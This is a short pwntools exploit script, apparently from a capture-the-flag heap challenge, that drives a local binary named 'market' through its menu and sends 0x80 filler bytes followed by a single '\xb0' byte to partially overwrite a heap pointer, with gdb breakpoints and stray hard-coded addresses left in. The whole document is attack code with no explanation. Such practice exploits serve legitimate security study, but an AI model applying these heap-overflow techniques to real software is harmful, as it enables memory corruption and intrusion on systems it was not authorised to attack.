from pwn import *
import sys
import time

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

script = """
# init-pwngdb
tracemalloc on
# b 50
b 61
# b 65
b 70
b 81
"""
0x5623fab772a0
0x5623fab70ab0

if len(sys.argv) > 1:
    p = gdb.debug("./market", gdbscript=script, level="debug")
else:
    p = process("./market")

p.sendlineafter(b"> ", b"no")
p.sendlineafter(b"> ", b"ray")
p.sendlineafter(b"> ", str(0x280))
p.sendafter(b"> ", flat(b"A"*0x80, "\xb0"))
p.sendlineafter(b"> ", b"4")
p.sendlineafter(b"> ", str(0x10))
p.sendafter(b"> ", flat(b"A"*0x10))
p.sendlineafter(b"> ", b"2")

log.info(p.recvlineS())
p.interactive()
